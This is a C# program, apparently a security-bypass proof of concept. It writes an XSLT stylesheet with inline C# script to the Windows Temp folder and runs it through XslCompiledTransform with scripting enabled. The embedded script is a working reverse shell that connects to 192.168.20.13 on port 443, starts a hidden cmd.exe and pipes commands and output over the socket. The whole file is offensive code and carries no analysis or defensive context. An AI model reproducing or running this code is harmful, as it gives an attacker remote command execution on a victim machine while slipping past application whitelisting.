using System;
using System.IO;
using System.Text;
using System.Xml;
using System.Xml.XPath;
using System.Xml.Xsl;

namespace XsltTest
{
    class Program
    {
        private static string strxslfile = @"<xsl:stylesheet version=""2.0"" 
                xmlns:xsl=""http://www.w3.org/1999/XSL/Transform""
                xmlns:msxsl=""urn:schemas-microsoft-com:xslt""
                xmlns:xslCSharp=""urn:BypassTest"">
    <msxsl:script implements-prefix='xslCSharp' language='Csharp'> 
        <msxsl:using namespace=""System.Net.Sockets"" />
        <msxsl:using namespace=""System.IO""/>
        <msxsl:using namespace=""System.Diagnostics""/>
        public static StreamWriter streamWriter;
            public static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
            {
                StringBuilder strOutput = new StringBuilder();
                if (!String.IsNullOrEmpty(outLine.Data))
                {
                    try
                    {
                        strOutput.Append(outLine.Data);
                        streamWriter.WriteLine(strOutput);
                        streamWriter.Flush();
                    }
                    catch (Exception ex) { throw ex; }
                }
            }
            public void Execute() 
            {
                using (TcpClient client = new TcpClient(""192.168.20.13"", 443)) 
                {
                    using (Stream stream = client.GetStream())
                    {
                        using (StreamReader rdr = new StreamReader(stream))
                        {
                            streamWriter = new StreamWriter(stream);
                            StringBuilder strInput = new StringBuilder();
                            Process p = new Process();
                            p.StartInfo.FileName = ""cmd.exe"";
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardInput = true;
                            p.StartInfo.RedirectStandardError = true;
                            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                            p.Start();
                            p.BeginOutputReadLine();
                            while (true)
                            {
                                strInput.Append(rdr.ReadLine());
                                p.StandardInput.WriteLine(strInput);
                                strInput.Remove(0, strInput.Length);
                            }
                        }
                    }
                }
            }
  </msxsl:script>
  <xsl:template match=""success"" >
    <result>
      <xsl:value-of select=""xslCSharp:Execute()"" />  
     </result> 
   </xsl:template>
</xsl:stylesheet>";

        private static string inlinerxmlpath = @"C:\Windows\Temp\inliner.xml"; 
        private static string inlinerxslpath = @"C:\Windows\Temp\RunFromHere.xsl"; 
        static void createxsl()
        {
            File.WriteAllText(inlinerxslpath, strxslfile, Encoding.UTF8); 
        }

        static void createxml() 
        {
            XmlTextWriter inlinerdata = new XmlTextWriter(inlinerxmlpath, Encoding.UTF8);
            inlinerdata.WriteStartDocument(true);
            inlinerdata.Formatting = Formatting.Indented;
            inlinerdata.WriteStartElement("success");
            inlinerdata.WriteEndElement();
            inlinerdata.WriteEndDocument();
            inlinerdata.Close();
        }

        static void Inlinerexecute()
        {
            XsltSettings oxsltsettings = new XsltSettings(false, true); //initiase with script enabled option
            XmlUrlResolver oResolver = new XmlUrlResolver();

            XslCompiledTransform oxsl = new XslCompiledTransform(); // new instance of XslCompiledTransform
            oxsl.Load(inlinerxslpath, oxsltsettings, oResolver); // loads the xslt (the one with the c# code to execute)

            //Load the XML data file
            XPathDocument doc = new XPathDocument(inlinerxmlpath);

            //Create an XmlTextWriter to output to the console.             
            XmlTextWriter writer = new XmlTextWriter(Console.Out);
            writer.Formatting = Formatting.Indented;

            //Transform the file.
            oxsl.Transform(doc, writer); // executes the transform
            writer.Close();
        }

        static void Main(string[] args)
        {
            createxml(); // generates the xml first
            createxsl(); // generates the xslt 
            Inlinerexecute(); 
        }
    }
}